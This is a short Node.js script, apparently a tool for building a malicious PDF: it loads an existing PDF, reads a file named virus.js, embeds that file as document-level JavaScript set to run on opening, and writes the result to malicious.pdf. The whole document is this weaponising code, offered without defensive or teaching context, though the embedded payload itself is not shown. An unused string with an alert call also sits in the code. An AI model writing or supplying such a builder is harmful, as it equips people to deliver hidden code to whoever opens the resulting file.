const fs = require('fs');
const path = require('path');
const { PDFDocument } = require('pdf-lib');

async function createMaliciousPDF() {
    const existingPdfPath = './file.pdf';  // Path to the existing PDF
    const existingScriptPath = './virus.js';  // Path to the existing script

    // Read the existing PDF and the script file
    const existingPdfBytes = fs.readFileSync(existingPdfPath);
    const existingScript = fs.readFileSync(existingScriptPath, 'utf-8');

    // Load the existing PDF document
    const pdfDoc = await PDFDocument.load(existingPdfBytes);

    // Add a new page to the existing PDF (optional)
    const page = pdfDoc.addPage([600, 400]);
    page.drawText('This is a test PDF. Opening it will execute a script.', { x: 50, y: 350 });

    // Embed the existing script into the PDF with a trigger for opening the document
    const maliciousScript = `
        app.alert('This is a malicious script!');
        ${existingScript}
    `;
    
    pdfDoc.addJavaScript('MaliciousScript', existingScript);

    // Save the modified PDF with embedded script
    const pdfBytes = await pdfDoc.save();
    fs.writeFileSync('malicious.pdf', pdfBytes);
    console.log('Malicious PDF created as malicious.pdf');
}

createMaliciousPDF();
